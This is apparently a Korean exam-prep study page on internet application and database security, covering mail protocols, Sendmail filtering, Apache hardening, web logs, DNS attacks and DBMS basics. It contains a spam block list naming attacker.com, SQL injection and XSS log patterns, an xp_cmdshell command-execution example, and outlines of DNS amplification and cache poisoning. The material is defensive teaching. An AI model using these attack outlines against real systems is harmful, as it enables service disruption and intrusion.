서버에 접속하여 저장된 메일을 내려받는 MDA 프로그램   POP3 특징            항상 연결 상태가 아닌 네트워크 접근에 유리       사용자는 메일의 Local 복사본을 검색하고 오프라인으로 읽을 수 있음       서버에 읽지 않은 메일만 보관, 메일을 읽은 후 삭제       메일을 서버에 저장하는 방법이 없음           3. IMAP 및 IMAP4     POP과 달리 메일을 내려 받더라도 메일 박스에 원본은 계속 저장됨   TCP 143   IMAP 및 IMAP4의 특징            온라인 및 오프라인에서도 유효       오프라인 작업 시 MUA 측에서 트랜잭션을 저장하고 서버에 연결되면 Commit한 것으로 반영한다.       메일은 메일 서버에 항상 저장되고 Local 복사본을 검색한 시점에 서버에서 제거할 수도 있음       메일상태를 중앙에서 관리할 수 있고 여러 단말을 통해서 동일한 E-Mail을 읽을 수 있음       메일 소프트웨어와 관계없이 메일을 관리할 수 있음       메일의 헤더만 검색해서 텍스트 부분만 가져오기 등의 작업이 가능       IMAP 4는 프로토콜의 복잡성과 보안문제를 개선           4. SMTP 메일 처리 방식     이미지 출처      MTA(Mail Transfer Agent) : 메일을 전송하는 서버   MDA(Mail Delivery Agent) : 수신측에 고용된 우체부 역할, MTA에게 받은 메일을 사용자에게 전달   MUA(Mail User Agent) : 사용자들이 사용하는 클라이언트 애플리케이션   2. E-Mail 보안 기법  1. PGP(Pretty Good Privacy)     개요            MIME(Multipurpose Internet Mail Extension, RFC 1521) 객체에 암호화와 전자서명 기능을 추가한 암호화 프로토콜       네트워크를 통해 주고받는 메시지에 대해 송수신자에게 보안서비스를 제공       평문 메시지 암호화       서명, 압축, 분할, 전자 우편 호환성       수신 부인 방지와 메시지 부인 방지는 제공하지 않는다.       분산형 키관리                PGP 특징                                  PGP 서비스           상세 내용                                           전자서명           DSS/SHA 또는 RSA/SHA로 전자서명이 가능                             메시지 암호화           CAST-128, IDEA, 3DES로 메시지 암호화                             1회용 세션키 생성           Diffie-Hellman 혹은 RSA로 키 분배                             이메일 호환           RADIX-64로 바이너리를 ACS Code로 변환                             세그먼테이션           메시지 최대 사이즈를 제한                           2. PEM(Privacy Enhanced Mail)     프라이버시 향상 이메일   중앙집중화된 키 인증 방식   구현이 어렵고 높은 보안성 제공 (군사, 은행)   DES CBC MD5   3. S/MIME(Secure Multi-Purpose Internet Mail Extensions)     개요            표준 보안 메일 규약, 송신자와 수신자를 인증, 메시지 무결성 증명, 첨부파일 포함       메시지 내용의 Privacy를 보증하는 표준 보안 메일 프로토콜, 메일 전체를 암호화       인터넷 MIME 메시지에 전자 서명과 함께 암호화를 더한 프로토콜로서 RSA 암호 사용       CA(인증기관)로부터 자신의 공개키를 보증하는 인증서를 받아야 함       첨부 파일을 보안       서명 기능           S/MIME에 사용되는 암호화 키            DSS : 디지털 서명 알고리즘       3중 DES : 메시지의 암호       SHA-1 : 디지털 서명을 지원하기 위한 해시함수           Sendmail 보안  1. Sendmail     대표적인 Mail Transport Agent(MTA)   2. Sendmail 운영 모드     /usr/sbin/sendmail -&lt;Option&gt;            -bd : 데몬 모드로 실행       -bi : 앨리어스 데이터베이스 파일을 초기화       -bm : Be a mail sender(MDA만의 기능으로 작동)       -bp : 큐에 있는 내용을 프린터       -bs : 표준 입력으로 SMTP를 실행       -bt : 테스트 모드, rewrite를 테스트하기 위해 이용       -bv : 확인 모드           웜 및 바이러스 헤더를 입력한 후 결과로 필터링 동작 여부를 확인            /etc/mail/sendmail.cf : 룰셋       # /usr/lib/sendmail -bt : 테스트 모드 실행       &gt; check_nv boundary=\"====_ABC1234567890DEF_==== : NIMDA worm test           3. Sendmail 접근 파일(SPAM Mail 차단)     /etc/mail/access 작성 규칙            OK : 다른 rule이 거부하여도 들어오는 메일을 받아들임       RELAY : relay를 허용, 다른 rule이 거부하는 경우도 지정된 특정 도메인이 있는 사용자에게 오는 메일을 받음       REJECT : 수신 및 발신을 완전히 거부       DISCARD : 메일을 받기만 하고 메시지를 완전히 폐기       501 : 지정된 e-mail 또는 도메인에 대해 보내는 사람의 주소가 전체 또는 부분적으로 일치할 경우 메일 거부       550 : 특정 도메인에 관련된 메일을 거부           /etc/mail/access 설정            spam@abc.com    REJECT : 발송되는 메일의 수신 및 발신을 모두 거부       spammail.com    REJECT : 발송되는 메일의 수신 및 발신을 모두 거부       attacker.com    DISCARD : 수신 및 발신 모두를 폐기 (발신자에게 폐기통보 X)       useful.org      OK : 메일을 수신       201.1.1         RELAY : 201.1.1.0/24에서 발송되는 모든 메일의 수신 및 발신을 허용 (중계역할)       211.1.1         RELAY : 211.1.1.0/24에서 발송되는 모든 메일의 수신 및 발신을 허용 (중계역할)           스팸메일(Spam Mail) 차단 방법  1. Spam Mail 차단 방법     Spam Mail 차단 기법의 종류      이미지 출처      이미지 출처                  RBL(Real Time Blocking)       SPF(Sender Policy Framework)                       ⦁ 스팸메일에 사용되는 IP 리스트를 등록하고 차단 ⦁ 국내 : KISA의 RBL 서버에 특정 IP를 등록하고 차단함       ⦁ 발신자 : 자신의 메일 서버 정보와 정책을 나타내는 SPF 레코드를 해당 DNS에 등록함 ⦁ 수신자 : 메일 수신 시 발송자의 DNS에 등록된 SPF 레코드를 확인하여 해당 메일에 표시된 발송 IP와 비교하고 그 결과에 따라 수신 여부를 결정함           2. SpamAssassin     정의 : 점수를 이용하여 스팸 여부를 판단, Perl로 개발됨   특징 : Rule 기반 하에 Header와 Body를 분석하여 실시간 차단 리스트 (Internet-based real time blacklist(RBL)) 를 참고하여 각각의 룰에 매칭될 경우 점수를 매겨서 총 점수가 기준점을 초과하는지 여부에 따라 스팸 여부를 결정   첨부파일 검사 X   3. 메일 보안 기술(도구)의 종류     RBL(Real time Black List)            SPAM 메일 방지를 위해서 IP Black List 관리       한국에서는 KISA 에 IP 등록           SPF(Send Policy Framework)            허용된 도메인 혹은 IP 등에서 발송 여부를 확인       DNS를 설정하여 SPAM 메일을 방지함       DNS 에 발신 IP 등록           Spamassassin            Rule을 기반으로 하여 메일 헤더 및 내용을 분석       RBL 참조       Rule 매칭되고 총점수가 임계치를 넘으면 Spam 메일로 결정           Inflex            내부 혹은 외부로 발송되는 메일을 검사하고 첨부파일을 필터링       내용스캔, 메일 In 혹은 Out 정책, 첨부파일 필터링           Sanitizer            확장자를 사용한 필터링       MS Office 매크로 검사       악성파일 Score       감염된 메시지 보관장소 설정           Procmail            메일크기, 내용, 보낸 사람 등으로 필터링을 지원           웹 서버 보안(Web Server Security)  1. 웹(World Wide Web) 개요  1. WWW(World Wide Web)     메뉴 방식으로 서비스하던 기존의 인터넷 서비스를 Tim Berners-Lee 의 제안으로 하이퍼텍스트를 기반으로 웹문서를 활용하여 편의성을 향상시킨 서비스   2. WWW 특징                  특징       내용                       일관된 사용자 인터페이스       웹은 인터넷상에서 제공되는 많은 서비스의 통합된 접속 도구 역할을 하여 기존 프로토콜과 서비스를 제공함                 하이퍼텍스트(Hypertext)       다른 문서를 지정하는 포인터(Pointer)가 존재하여 정보와 연결된 다른 정보에 쉽게 접근할 수 있음                 능동적 참여       방대한 데이터 창고 역할뿐만 아니라 참여자들 사이에 다양한 정보를 공유                 분산된 저장소       서비스를 제공하는 서버에 모든 데이터가 집중되지 않고 웹의 각종 정보가 분산 저장됨                 개방형 표준       W3C 표준 프로토콜인 HTTP의 개방형 프로토콜을 지원하고 웹 페이지에 대한 웹 표준을 준수하여 하드웨어 및 소프트웨어 플랫폼에 독립적인 서비스를 지원함           3. Apache 웹 서버     웹서버의 역할            웹브라우저와의 세션(연결)을 관리       웹브라우저에서 전송되는 HTTP Request 메시지를 해석       필요한 프로세스 실행 후 HTML 형태로 HTTP Response 를 전송           httpd 라는 데몬(Daemon) 프로세스가 실행되어서 기동            httpd는 root 소유자의 권한으로 기동 (80번 포트 사용)       부모 프로세스 하나만 root 사용자로 실행       웹브라우저들이 접속을 하면 httpd 프로세스를 실행해서 요청처리       웹브라우저의 연결을 처리하는 프로세스는 apache 사용자로 기동                    fork 를 사용한 자식 프로세스 생성                           설정파일 : /etc/httpd/conf/httpd.conf            DocumentRoot : 홈 사이트 디렉터리           2. 웹 서버(Web Server) 보안  1. Apache 웹 서버 보안 설정                  보안 설정       내용                       주요 디렉터리 및 파일 접근 권한       Root에 의해 실행 가능한 모든 명령어는 다른 사용자가 수정하지 못하도록 설정⦁ # chown 0. bin conf logs ⦁ # chgrp 0. bin conf logs ⦁ #chmod 755 . bin conf logs ⦁ #chmod 511 /user/local/httpd/bin/httpd                 불필요한 파일 삭제       ⦁ 아파치 설치 시 기본적으로 설치되는 cgi-bin은 공격에 이용될 수 있으므로 삭제 ⦁ 매뉴얼 파일은 시스템에 대한 정보를 제공할 수 있어서 공격에 도움이 될 수 있으므로 삭제 ⦁ /var/www/manual 및 /var/www/cgi_bin 삭제                 Directory Listing       index.html이 없거나 Listing을 보여주는 옵션이 indexes에 설정되어 있는 경우 웹 페이지의 디렉터리가 보임                 FollowSynLinks       심볼릭 링크를 이용해서 파일 시스템에 접근하여 Root 권한을 획득할 수 있으므로 FollowSymLink를 제거                 Directory indexes       ⦁ 우선순위를 결정함 ⦁ index.cgi&gt;index.html&gt;index.htm의 순서 ⦁ # DirectoryIndex: sets the file that Apache will serve iof a directory is requested. ⦁ DirectoryIndex index.html                 Server Tokens       웹 서버에 접속할 경우 최소한의 정보만 보이도록 설정                 ServerSignature       ServerSignature on:on 으로 설정된 경우 아파치 버전 및 서버 이름이 노출됨                 접근 제어       클라이언트의 이름 및 IP 주소 등을 사용해 접근 제어 수행 &lt;Directory /&gt;     Options FollowSynLinks     AllowOverride None     Order deny,allow     Deny from all &lt;/Directory&gt;                 put 과 post의 제한                         CGI 스크립트 제한       AddHandler cgi-script.cgi 주석처리           2. Apache 웹 서버 Session 관리                  보안 설정       내용                       Timeout       ⦁ 웹브라우저가 웹 페이지에 접근한 뒤, 클라이언트의 요청에 서버가 대기하는 시간을 설정 ⦁ 기본값은 300초                 MaxKeepAliveRequests       ⦁ 하나의 지속적인 연결에서 서비스를 제공할 요청의 최대 값을 설정 ⦁ 0일 경우 무제한 기본값은 100                 KeepAliveTimeout       설정된 시간 동안 서버는 한 번의 요청을 받고 접속을 끊지 않고 유지한 상태에서 다음의 요청을 받아들임                 KeepAlive       ⦁ 접속 연결에 대한 재요청을 허용할 것인지 설정 ⦁ 기본값은 off이며 on으로 설정되면 MaxKeepAliveRequests 값과 연계됨           3. Apache 웹 서버 httpd.conf 파일 설정     예시       &lt;Directory \"D:/document\"&gt;       Options Indexes FollowSynLinks       AllowOverride All       Order Deny, Allow       Deny from all       Allow from 127.0.0.1   &lt;/Directory&gt;                  Order Deny, Allow                    먼저 Deny, 나중에 Allow                       Deny from all                    위의 설정은 모든 트래픽을 막는다.                       Allow from 127.0.0.1                    1번의 order deny, allow 및 2번의 Deny from all 조건에 따라 127.0.0.1 만 접속을 허용한다.           127.0.0.1 은 localhost 이기 때문에 자신의 컴퓨터를 제외한 다른 곳에서는 접속이 불가능한 상태로 설정한다.                           httpd.conf 특정 IP 주소만 차단       &lt;Directory \"D:/document\"&gt;       Options Indexes FollowSynLinks       AllowOverride All       Order Allow, Deny       Deny from 210.1.1.1       Allow from all   &lt;/Directory&gt;           ServerTokens [OS|Prod]            OS : HTTP Response 응답 시 Header의 Server 필드에 웹 서버 버전과 운영체제 정보를 제공       Prod : HTTP Response 응답 시 Header의 Server 필드에 웹 서버 종류만 제공           4. 웹 서버 IIS 구성     윈도우에서 제공하는 웹 서버        웹 서버 및 FTP, SMTP, NNTP 등의 다양한 서비스 제공                                  IIS 구성요소           내용                                           서비스           ⦁ 웹과 FTP 관리를 위한 IIS 관리 서비스 ⦁ World Wide Web 서버 서비스 ⦁ FTP 서비스 ⦁ 메일 발송을 위한 SMTP(Simple Mail Transport Protocol) ⦁ 뉴스그룹을 위한 NNTP(Network News Transport Protocol)                             계정 및 그룹           ⦁ IUSR_MACHINE(인터넷으로 접근하는 익명 계정) ⦁ IWAM_MACHINE(out-of-process로 실행되는 웹 애플리케이션이 실행되는 계정)                             폴더           ⦁ %windir%\\system32\\inetsrv(IIS 프로그램) ⦁ %windir%\\system32\\inetsrv\\iisadmin(IIS 관리 프로그램) ⦁ %windir%\\help\\iishelp(IIS 도움말 파일) ⦁ %systemdrive%\\inetpub(웹,FTP,SMTP 루트 폴더)                             웹 사이트           ⦁ 기본 웹 사이트(80번 포트) : %systemdrive%\\inetpub\\wwwroot ⦁ 관리 웹 사이트(3693번 포트) : %systemdrive%\\system32\\inetsrv\\iisadmin                           웹 로그(Web Log) 분석  1. 웹 로그(Web Log) 개요  1. 웹 로그(Web Log)     웹서버의 에러로그, 접속로그, 에이전트로그, 참조로그   lsof -p [PID] : 사용하고 있는 자원 확인 (예: 프로세스가 Open 하고 있는 파일)   httpd.conf 파일에 로그파일의 위치를 지정   access.log 구조            SQL Injection 공격 : sqlmap, select, union 등의 SQL 구문 기록       XSS 공격 : &lt;script&gt;, &lt;iframe&gt;, &lt;a&gt; 등과 같은 스크립트문 기록       업로드 파일 중 확장자가 *.php, *.jsp, *.asp 등이 있는지 확인       203.251.189.47 - - [03/Aug/2000:21:56:55 +0900] \"GET /doc/images/index.gif HTTP/                                      구조           내용                                           Host           클라이언트의 호스트명 혹은 IP 주소                             dent           ⦁ IdentityCheck 가 enable되고 있고, 클라이언트가 ident에 응답을 보내면 identity 정보를 기록 ⦁ 보통은 “-“로 대체                             Authuser           ⦁ 인증이 있는 경우 사용자명이 기록됨 ⦁ 보통은 “-“로 대체                             Date           접속한 날짜와 시간                             Request           클라이언트가 요청한 자료                             Status           요청한 것에 대한 상태 코드                             Bytes           Header를 제외한 전송된 바이트                           2. ErrorLog     ErrorLog 지시어            ErrorLog /var/log/httpd/error_log : 에러로그 파일 기록       ErrorLog syslog : 에러 발생 시 로그를 syslog에 기록                ErrorLog Level                                  Error Level           내용                                           Emerg           에러를 의미함                             Alert           불안정한 시스템 상황                             Crit           중대한 에러 발생                             Error           비교적 중대하지 않은 에러                             Warn           경고 발생                             Notice           일반적인 메시지 발생                             Info           정보 제공                             Debug           디버깅 정보                           Error Level별 설정            기본값 local7 퍼실리티를 통해 에러 기록       Local7.warn /var/log/httpd.warn.log : , syslog.conf 에서 제어       Local7.debug.!=notice /var/log/httpd.error_log : 디버그보다 높고 notice 이하에 대해 로그 기록           웹 서버 접속로그 access log            TransferLog /var/log/access.log : TransferLog 지시어를 사용, 로그위치 지정       IP, 요청일, 시간, HTTP 메소드, HTTP 상태 코드, 전송 바이트, 시간 기록           로그파일 포맷 지정   Access LogFormat 변경            LogFormat \"%h %l %u %t \\\"%r\\\" %&gt;s %b           CustomLog 지시자            TransferLog 및 LogFormat 지시자를 하나로 합쳐 놓은 지시자       CustomLog logfile format|nickname env=[!]environment-variable       CustomLog /logs/referrer_log \"%{Referer}i -&gt; %U                Common Log Format의 의미                                                  구분               세부 내용                                                               %h               원격지 호스트. 즉, 접속한 클라이언트 IP 주소를 의미                                         %I               원격지 사용자 ID                                         %u               인증이 요청된 원격 사용자 이름                                         %t               요청한 시간과 날짜                                         %r               HTTP 메소드를 포함한 요청의 첫 라인                                         %s               HTTP 상태코드                                         %b               HTTP 헤더를 제외하고 전송된 바이트                                         %{Referer}i               요청된 URL이 참조되거나 링크된 URL                                         %{User-Agent}i               접속한 클라이언트의 운영체제 및 브라우저 버전                                         %T               요청을 처리하는 데 걸린 시간(초)                                                   2. HTTP 상태 코드(Status Code)     HTTP 상태코드            100 Continue       101 Switching Protocols       200 OK       201 Created       202 Accepted       203 Non-Authoritative Information       204 No Content       205 Reset Content       206 Partial Content       300 Multiple Choices       301 Moved Permanently       302 Moved Temporarily       303 See Other       304 Not Modified       305 Use Proxy       400 Bad Request       401 Unauthorized       402 Payment Required       403 Forbidden       404 Not Found       405 Method Not Allowed       406 Not Acceptable       407 Proxy Authentication Require       408 Request Time-out       409 Conflict       410 Gone       411 Length Required       412 Precondition Failed       413 Request Entity Too Large       414 Request-URI Too Large       415 Unsupported Media Type       500 Internal Server Error       501 Not Implemented       502 Bad Gateway       503 Service Unavailable       504 Gateway Time-out       505 HTTP Version not supported           웹 방화벽(Web Firewall)  1. 웹 방화벽(Web Firewall) 개요  1. 웹 방화벽(Web Firewall)     홈페이지 자체 및 웹 프로토콜을 기반으로 하는 모든 서비스와 애플리케이션 데이터 기반 정보 시스템에 보안서비스를 제공   웹 애플리케이션 취약점을 이용한 공격에 대응   웹 서버 해킹을 경유하여 기업 내부의 중요 데이터 유출을 방지   2. 구간별 웹 취약점                  구간       Client       Internet       Web Server&lt;–&gt;Was       Was&lt;–&gt;DB                       취약점       ⦁ XSS ⦁ ActiveX       ⦁ Sniffing       ⦁ Web Server S/W 취약성 ⦁ 입력 값 검증 부재 ⦁ 사이트 구조 ⦁ Application 로직 공격       ⦁ 질의 조작 ⦁ 질의 조작을 통한 System Call           3. 웹 방화벽 종류                  종류       내용                       네트워크 기반 방화벽       ⦁ 방화벽이나 침입방지 시스템과 유사하게 네트워크 구간에 인라인 Transparent 및 Proxy 방식으로 구성 ⦁ 웹 트래픽에 대한 분석 및 차단 기능                 호스트 기반 방화벽       웹 서버에 설치된 보안 에이전트와 마스터 서버, 관리자용 콘솔로 구성되며 웹 서버의 에이전트가 해킹 시도 및 이상 징후를 탐지하고 보안 정책을 실행                 Proxy Method       ⦁ 웹 서버 앞 단에서 클라이언트 요청을 받아 필터링 처리 후 웹 서버와 재접속 하는 방식 ⦁ 소프트웨어 기반 및 하드웨어 기반 방화벽 지원                 Filtering Module Method       ⦁ 웹 방화벽이 웹 서버의 플러그인 모듈처럼 동작하는 방식 ⦁ 웹 서버가 처리 대기상태에서 보안 모듈에 필터링 처리된 후 정상 트래픽만 클라이언트에 응답하는 방식           4. 웹 방화벽 주요 기능                  주요 기능       내용                       웹 공격 방지       논리적 공격, Client Side 공격, 명령어 실행, 정보 유출 등의 공격에 보안 및 차단                 Positive Security Model 지원       강제 접근 및 알려지지 않은 공격을 차단                 SSL 지원       SSL 트래픽에 복호화를 지원                 애플리케이션 구조 변화에 대응       서비스 지속성을 보장           5. 워터링 홀(Watering Hole) 공격      이미지 출처      사막의 오아시스(특정 사이트) 에 다가오는 초식동물(Victim) 을 노리는 육식동물 (Hacker)   워터링 홀 공격(특정 타겟)은 홈페이지에 접속하는 특정 사회적 그룹을 대상으로 악성코드를 유포하여 특정 사회적 그룹에 추가적인 APT 공격 등을 목적으로 한다.            예) 외교 관련 사이트에 악성코드를 심고 외교부 관계자가 접속하면 해당 PC에 악성코드를 설치, 그 PC에서 정보를 빼냄           DNS 보안  1. DNS(Domain Name Service) Query  1. DNS (Domain Name Service)     인터넷 네트워크상에서 컴퓨터의 이름을 IP 주소로 변환하거나 해석하는 데 사용되는 분산 네이밍 시스템   URL 주소에 대한 IP 주소를 알려주는 서비스   nslookup : DNS 확인 도구            nslookup www.naver.com           DNS 질의 우선순위            Windows                    DNS cache table 확인 (ipconfig /displaydns)           C:\\windows\\system32\\drivers\\etc\\hosts.ics 파일 내용 확인           C:\\windows\\system32\\drivers\\etc\\hosts 파일 내용 확인           DNS 서버에게 질의           ipconfig /flushdns : DNS 캐시 테이블을 모두 삭제                       Linux                    nscd(Name Service Cache Daemon) 확인 (별도 데몬 설치필요)           /etc/hosts.conf 파일 내용 확인           DNS 서버에게 질의                           2. DNS 구조      이미지 출처      Root Domain(.) : 모든 도메인의 근본이 되는 최상 Root level Domain   Top Level Domain : com, org, kr 등의 국가, 지역을 나타냄   Second Level : 사용자가 도메인 명을 신청해서 등록할 수 있는 영역   3. DNS 서비스 방식      이미지 출처      DNS Query 종류            Recursive Query(순환) : Local DNS 서버에 Query를 보내 완성된 답을 요청       Iterative Query(반복) : Local DNS 서버가 다른 DNS 서버에게 Query를 보내어 답을 요청, 외부 도메인에서 개별적인 작업을 통해 정보를 얻어와 종합해서 알려줌           DNS Query 세부 방식            클라이언트가 UDP로 DNS Request를 DNS Server에 전송       DNS 서버는 DNS Request에 대해서 DNS Response로 응답, 요청한 IP 주소를 넣어서 보내줌           DNS 증폭공격            출발지 IP를 Victim의 IP (DNS Server) 로 변조함       Open DNS Resolver 서버를 이용       DNS Query의 Type을 “ANY”로 설정                    다양한 TYPE인 A, NS, CNAME, AAAA 등의 모든 레코드를 요청하기 때문에 요청한 쿼리 패킷보다 크게 증폭됨                       DoS 공격으로, DNS Reflector Attack 이라고도 함                DNS 레코드                                  종류           내용                                           A(Address)           호스트 이름을 IPv4 주소로 매핑                             AAAA(IPv6 Address)           호스트 이름을 IPv6 주소로 매핑                             PTR (Reverse-lookup Pointer records)           IP 주소를 기반으로 도메인 이름을 찾는 데 사용                             NS(Name Server)           주어진 호스트에 대한 공식적인 Name Server를 알려줌                             MX(Mail Exchanger)           DNS 도메인 이름에 대한 메일 교환 서버를 알려줌. 이 정보는 SMTP 가 전자 메일을 적절한 호스트로 라우팅하는데 사용.                             CNAME(Canonical Name)           호스트의 다른 이름(별칭)을 정의하는 데 사용, A레코드의 별명을 달아 주는 것                             SOA(Start of Authority)           도메인에 대한 권한을 갖는 서버를 표시함. 도메인에서 가장큰 권한을 부여받은 호스트를 선언 (기본 Name Server, 도메인 관리자의 전자메일, 도메인 일련번호 등 DNS 핵심정보)                             Any(ALL)           위의 모든 레코드를 표시                           2. DNS 보안  1. dnsspoof     DNS Spoofing 을 할 수 있는 공격 도구   지정된 DNS 파일을 참조해서 DNS를 수행하게 함   53번 포트로 전송되는 UDP 데이터를 모니터링 하고 있다가 지정된 URL에 대해 요청이 오면 특정 IP로 응답함            UDP는 세션이 존재하지 않아서 먼저 도착한 패킷을 신뢰하며 다음에 도착한 정보는 버림.                한국인터넷진흥원 DNS 싱크홀          이미지 출처             악성봇에 감염된 PC를 공격자가 조종하지 못하도록 악성봇과 공격자의 명령을 차단하는 서비스       자체 DNS 서버를 운영하는 민간기관을 대상으로 제공하는 서비스           2. DNSSEC     DNSSEC            DNS 캐시 포이즈닝과 DNS의 보안 취약점을 보완하기 위해서 등장한 기술       DNS 응답 정보에 전자서명 값을 첨부하여 보내고 수신측이 해당 서명 값을 검증       DNS 위변조 방지, 정보 무결성 제공           DNSSEC 정보 제공            공개키로 서명용 키 쌍을 생성하여 사전에 배포       개인키를 가지고 자신이 제공하려는 정보의 해시값을 서명 처리하여 전자서명 값을 생성       원본 데이터와 추가된 전자서명 값을 함께 인터넷상에 제공           DNSSEC 정보 이용자            정보제공자로부터 수신한 정보의 원본 데이터와 전자서명 값을 분리       사전에 정보제공자로부터 수신한 공개키 값을 가지고 전자서명 값을 복호화       원본 데이터를 해시 처리한 값과 복원된 전자서명 값을 비교하여 무결성 여부 확인           3. DNS Cache Poisoning Server Attack     DNS 조회 방식            Client는 Local 네트워크인 DNS에 DNS Query를 보내면 Root DNS 로부터 시작해서 Query를 조회한 다음 사용자가 요청한 www.abc.com 의 정보를 받아서 쿼리에 대한 응답을 제공한다.       Local DNS는 해당 정보를 Cache에 저장해 두고 비슷한 요청이 오면 다른 서버에 묻지 않고 바로 전송한다.           DNS Cache Poisoning Server 공격            Local DNS Server로 DNS 쿼리 응답 패킷을 전송한다.       DNS 유효 패킷은 출발지 포트번호, 목적지 포트번호, 트랜잭션 ID가 맞아야 한다.       트랜잭션 ID 는 16Bit 필드이고 0부터 값을 유추해서 계속 넣으면 32768번의 공격으로 트랜잭션 ID를 맞출 수 있다       이 때 Local DNS 서버에 잘못된 쿼리를 삽입한다.          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","애플리케이션 보안","인터넷 응용 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-03Application-01Internet/",
        "teaser": null
      },{
        "title": "03.애플리케이션 보안 - 02.데이터베이스 보안",
        "excerpt":"데이터베이스(Database) 개요  1. 데이터베이스(Database) 개요     데이터베이스(Database)            목적을 위해 각종 데이터를 일정한 규칙으로 저장하여 관리하는 것       여러 사람들이 공동으로 사용, 데이터를 공유       SQL (Structured Query Language) : 데이터베이스에서 사용하는 표준 언어                    데이터 정의어 : 테이블 생성, 수정, 삭제           데이터 조작어 : 조회, 삽입, 수정, 삭제           데이터 제어어 : 사용자 생성, 권한 부여                                데이터베이스 기능                                  요소           대응책                                           지속성(Persistence)           영속성, 데이터베이스 재사용(Database reuse)                             데이터 공유(Data Sahring)           ⦁ 동시 사용 ⦁ 시뮬레이션 데이터베이스 유지(Simultaneous database use                             회복(Recovery)           원래 상태로 데이터베이스 복구(Restore database to original state                             데이터베이스 언어 (DataBase Language)           SQL, 질의처리 및 쿼리(Manipulate and query)                             보안&amp;무결성 (Security &amp; Integrity)           데이터베이스 쿼리 및 지속(Database query and consistency)                           데이터베이스 관리 시스템(DBMS, Database Management System)            데이터베이스 생성,관리,응용하기 위해 구성된 소프트웨어 모임           데이터베이스 관리 시스템 기능            데이터의 형태, 구조, 효율적인 데이터베이스의 저장에 관한 내용 정의, 빠른 검색       다양한 응용 프로그램과 데이터베이스가 서로 인터페이스 할 수 있는 방법 제공       구현된 하나의 물리적 구조의 데이터베이스                데이터베이스 관리 시스템 구성요소                                  구성요소           내용                                           DDL 컴파일러           DDL로 명세한 스키마를 내부 형태로 처리하여 시스템 카탈로그에 저장                             질의어 처리           터미널을 통해 일반 사용자가 요청한 고급 질의어를 처리                             예비 컴파일러           응용 프로그래머가 호스트 프로그래밍 언어로 작성한 응용 프로그램 속에 삽입시킨 DML 명령어를 추출                             데이터 조작어 컴파일러           데이터 조작어 명령어를 목적코드로 변환                             런타임 데이터베이스 처리기           실행 시간에 데이터베이스 접근을 취급                             트랜잭션 관리자           무결성 제약조건 만족 여부, 접근 권한 검사, 병행 제어, 장애 발생 시 회복 작업                             저장 데이터 관리자           디스크에 있는 데이터베이스 접근 제어, 기본 OS 모듈 이용, 로깅, 데이터 회복 등에 필요한 모듈을 호출                           2. 데이터베이스 모델(Database Model)     데이터베이스 모델(Database Model)            데이터 구조를 논리적으로 표현해, 데이터, 데이터 관계, 데이터 의미 및 데이터 제약 조건을 기술하기 위한 개념적 도구들의 집단                    계층형           관계형           네트워크형                           개체관계 모델(ERD, Entity Relationship Diagram)            현실 세계의 데이터를 컴퓨터 세계의 물리적인 데이터베이스로 변경하는 중간 과정(현실 세계의 추상화)       데이터의 구조를 개념적으로 표현       관리대상이 되는 정보 추출, 정보간 관계를 시각화       구성 요소                    개체(Entity) : 관리할 대상           관계(Relation) : Entity 간의 관계           속성(Attribute) : Entity의 특성이나 속성                           MySQL 데이터베이스     MySQL 데이터베이스 연결            mysql -u root -p       lsof -p 3615 | grep LISTEN       netstat -auntp | grep mysql           MySQL 사용자 생성            show databases;       use mysql;       show tables;       desc user;       select user, password from user;       create user \"scott\" identified by \"1234\";       drop user scott;           grant 와 revoke            grant select, insert on users to scott;       grant all privileges on test.* to scott;       show grants;       grant all privileges on test.* to scott with grant option;       revoke all on test to scott;           MySQL 설정 파일            /etc/mysql/my.cnf                    bind-address = 127.0.0.1 : 시스템 내부에서만 접속 가능                           MS-SQL xp_cmdshell 취약점 : 윈도우 명령 Shell을 생성, 실행 가능            EXEC xp_cmdshell 'ping www.abc.com'; : 운영체제 명령 실행           Oracle 데이터베이스     SQL*plus : 데이터베이스 연결   기본 사용자            system : 데이터베이스 관리       sys : 데이터베이스 관리       scott : 테스트 용도           절차            sqlplus       create user scott2 identified by 1234;       select username, password from dba_users : Data Dictionary 중 DBA_USERS       desc dba_users;       grant dba to scott2; : scott2 에게 dba 롤 부여       connect scott2/1234           데이터베이스 보안  1. 데이터베이스 보안(Database Security)     각종 내,외부적 위협에서 데이터베이스의 기밀성, 무결성, 가용성 확보 활동   인가되지 않은 접근, 의도적인 데이터 변경/파괴 및 일관성을 저해하는 사고로부터 보호   2. 데이터베이스 보안 위협요소                  위협요소       설명                       집합성(Aggregation)       ⦁ 낮은 보안 등급의 정보들을 이용하여 높은 등급의 정보를 알아내는 것 ⦁ 개별정보는 의미가 부족하나 합치면 중요 정보를 알 수 있음 ⦁ 파트별 영업실적을 조회하여 회사의 전체 영업실적을 알아냄                 추론(Inference)       ⦁ 보안 등급이 없는 일반 사용자가 보안으로 분류되지 않은 정보에 정당하게 접근하여 기밀 정보를 유추해 내는 행위 ⦁ 로우 데이터(Raw data)로부터 민감한 데이터를 유출하는 행위 ⦁ 파티션(Partition), 셀 은닉(Cell suppression) 등을 방지 ⦁ 파티션 내 보안대책을 암호화하여 정당하지 않은 사용자의 접근을 방지 ⦁ 보안대책 : 다중인스턴스화(Polyinstantiation)              다중 인스턴스화(Polyinstantiation) : 추론으로부터 정보 유출을 막기 위한 기술, 변수를 값 또는 다른 변수와 함께 있게 함으로써 상호 작용을 하도록 하는 프로세스   3. 데이터베이스 보안 요구사항                  보안 요구사항       주요 내용                       무결성 보장       ⦁ 처리 중 운영적 무결성 보장 ⦁ 처리된 데이터의 의미적 무결성 보장                 추론 방지       ⦁ 일반 정보에서 기밀정보를 추측하고 도출하는 추론 방지 ⦁ 통계적 집계 정보에서 각 객체에 추론 방지                 사용자 제한       ⦁ 인가된 사용자만이 접근 가능 ⦁ 보다 엄격한 사용자 인증 기준 마련                 감사 기능       ⦁ 모든 접근 기록(Write, Read)을 저장함 ⦁ 접근 단계별 log trail 축적                 암호화       주요 데이터의 암호화           데이터베이스 보안 솔루션  1. DB 암호화 솔루션     개념            민감 데이터가 입력되면 암호화키를 사용해서 암호화를 수행       조회하는 경우 암호화키로 복호화를 시킨 후에 확인       주민등록번호는 반드시 암호화를 수행하며 이 때 솔루션 사용       패스워드의 경우 암호화 솔루션보다 SHA-256 이상 해시함수를 의무적으로 사용 (일방향 암호화)           장점            허가받지 않은 사용자가 불법적인 데이터를 취득해도 볼 수 없음           단점            운영 서버에 부하가 발생       DB 단위의 접근 제어가 안 됨       SQL 문장에 대한 로깅이 안 됨           방식            Plug In 방식  